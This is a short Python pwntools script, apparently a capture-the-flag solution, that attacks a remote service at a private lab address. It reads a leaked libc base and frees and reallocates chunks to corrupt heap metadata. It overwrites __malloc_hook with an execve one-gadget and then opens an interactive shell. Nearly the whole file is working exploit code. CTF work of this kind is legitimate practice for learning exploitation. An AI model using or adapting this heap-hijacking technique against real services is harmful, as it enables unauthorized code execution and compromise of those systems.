#!/usr/bin/python2
from pwn import *

io = remote('172.22.219.115', 5555)

# io = remote('10.21.232.108', 5555)
libc = ELF("./libc.so.6")
log.info("_malloc_hook offset: {}".format(hex(libc.symbols["__malloc_hook"])))
f = open("in.txt", "w")
leak = io.recvline().strip()[17:]
libc.address = int(leak, 16)
# offset in libc
log.info("Libc base: {}".format(hex(libc.address)))
execve = libc.address + 0x4f2af


def make(payload):
    io.write("a\n")
    io.write(payload + "\n")
    io.write("1\n")


def destroy(idx):
    io.write("r\n")
    io.write(str(idx) + "\n")


for i in range(3):
    make("AAAA")
destroy(3)
destroy(2)
make("A" * 24 + "\x00" * 7 + "\x21" + p64(libc.symbols["__malloc_hook"]).replace("\x00", ""))
system = libc.symbols["system"]
make("A")
make(p64(execve).replace("\x00", ""))
log.info("system: {}".format(hex(system)))
log.info("malloc:{}".format(hex(libc.symbols["__malloc_hook"])))

io.interactive()
